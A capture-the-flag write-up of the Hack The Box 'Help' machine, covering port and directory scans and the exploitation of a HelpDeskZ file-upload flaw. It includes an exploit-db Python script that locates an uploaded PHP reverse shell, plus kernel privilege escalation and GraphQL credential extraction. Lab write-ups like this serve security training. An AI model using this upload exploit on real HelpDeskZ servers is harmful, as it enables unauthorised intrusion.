---
"title": "Hack The Box - Help"
"date": 2019-12-08
"tags": ["linux", "easy", "node", "kernel_exploit"]
"keywords": ["linux", "easy", "node", "kernel_exploit"]
"author": "Ghostbyt3"
"description": "We are going to pwn Help from Hack The Box."
"featured_image": "/img/htb-help/1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Writeup"
---


![Untitled](/img/htb-help/1.png)

We are going to pwn Help from Hack The Box.

Link : [https://www.hackthebox.eu/home/machines/profile/170](https://www.hackthebox.eu/home/machines/profile/170)


Like always begin with our Nmap Scan.

## Nmap Scan Results:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp


PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets begin from HTTP,It is an apache default webpage
![Untitled](/img/htb-help/2.png)

So bruteforce the directories
## Gobuster Results:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.121
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/15 00:08:21 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
===============================================================
2019/12/15 00:10:45 Finished
===============================================================
```

Found ``HelpDeskZ`` on ``/support``
![Untitled](/img/htb-help/3.png)
It has a login page too.

A quick check for any exploits available I found this

>https://www.exploit-db.com/exploits/40300 

From the exploit I came to know we need to submit a ticket
![Untitled](/img/htb-help/4.png)

I gave some random and uploaded my reverse shell as ``root.php``
![Untitled](/img/htb-help/5.png)

When I click uploaded it says[br/](br/)
![Untitled](/img/htb-help/6.png)

Then I checked the source code of the ``HelpDeskz`` on github

>https://github.com/evolutionscript/HelpDeskZ-1.0

I came to know when we uploaded it shows ``Not allowed`` but its not deleting ,The file is still saved on the server.

I already found an exploit from ``exploitdb`` so I just edited some 


```
import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
```

I changed the ``url`` , I found that from the github repo.

Now I executed the scirpt on my machine with listening on another terminal.
![Untitled](/img/htb-help/7.png)

I got an user ``help``

## Privilege Escalation:

While checking the kernel it looks old one 
![Untitled](/img/htb-help/8.png)

> https://www.exploit-db.com/exploits/44298 

Got an exploit for that version

Uploaded the script to the machine 

![Untitled](/img/htb-help/9.png)[br/](br/)
Got Root

## Enumerating ``Node.js``:

It looks like ``node.js`` running on port ``3000``[br/](br/)
![Untitled](/img/htb-help/10.png)

It give us some message that we need to find the credentials with given query.

Mostly ``node.js`` run as ``express graphql``

I test it with adding ``graphql?`` [br/](br/)
![Untitled](/img/htb-help/11.png)

It shows some message so I tested with changing it to ``test`` and it gives me some error so I confirmed there is ``graphql``
![Untitled](/img/htb-help/12.png)

We know the message told us to find in given ``query`` and I googled about it and found this 
![Untitled](/img/htb-help/13.png)

So I added username and password [br/](br/)
![Untitled](/img/htb-help/14.png)[br/](br/)
Got some credentials

It looks like md5sum so I cracked with online crackstation
![Untitled](/img/htb-help/15.png)

It works for ``HelpDeskz`` login
![Untitled](/img/htb-help/16.png)